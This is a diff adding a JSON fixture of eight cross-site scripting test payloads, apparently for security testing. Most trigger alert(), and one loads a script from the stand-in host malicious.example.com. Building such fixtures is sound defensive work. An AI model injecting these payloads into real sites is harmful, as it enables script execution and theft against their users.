@@ -1,0 +1,60 @@
+{
+    "xss_injection_cases": [
+        {
+            "id": "basic-alert",
+            "description": "Basic alert popup to test for XSS vulnerability",
+            "payload": "<script>alert('XSS');</script>",
+            "response_expected": "alert triggered",
+            "vector_type": "reflected"
+        },
+        {
+            "id": "img-onerror",
+            "description": "Image tag with onerror attribute to trigger JS code execution",
+            "payload": "<img src='invalid.jpg' onerror='alert(\"XSS\");'>",
+            "response_expected": "alert triggered",
+            "vector_type": "stored"
+        },
+        {
+            "id": "script-injection",
+            "description": "Injection of script tag with external JS source",
+            "payload": "<script src='http://malicious.example.com/xss.js'></script>",
+            "response_expected": "external script executed",
+            "vector_type": "DOM-based"
+        },
+        {
+            "id": "html-attribute",
+            "description": "Injection into an existing HTML attribute",
+            "payload": "' onmouseover='alert(\"XSS\")",
+            "response_expected": "alert triggered on mouseover",
+            "vector_type": "reflected"
+        },
+        {
+            "id": "javascript-url",
+            "description": "Using a javascript: URL to execute code in the context of the current page",
+            "payload": "javascript:alert('XSS');",
+            "response_expected": "alert triggered",
+            "vector_type": "reflected"
+        },
+        {
+            "id": "event-handler",
+            "description": "Injection through event handler",
+            "payload": "<div onpointerenter='alert(\"XSS\")'>Move pointer here</div>",
+            "response_expected": "alert triggered on pointer enter",
+            "vector_type": "stored"
+        },
+        {
+            "id": "svg-injection",
+            "description": "SVG image tag with embedded JS",
+            "payload": "<svg onload='alert(\"XSS\")'><svg>",
+            "response_expected": "alert triggered on SVG load",
+            "vector_type": "DOM-based"
+        },
+        {
+            "id": "iframe-injection",
+            "description": "Injection via iframe tag",
+            "payload": "<iframe src='javascript:alert(\"XSS\");'></iframe>",
+            "response_expected": "alert triggered from iframe",
+            "vector_type": "reflected"
+        }
+    ]
+}
